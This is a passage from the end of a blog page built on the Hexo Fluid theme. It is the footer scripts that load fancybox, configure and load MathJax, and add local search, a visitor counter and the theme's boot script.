  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }

        Fluid.events.registerRefreshCallback(function() {
          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
            MathJax.startup.document.state(0);
            MathJax.texReset();
            MathJax.typeset();
            MathJax.typesetPromise();
          }
        });
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
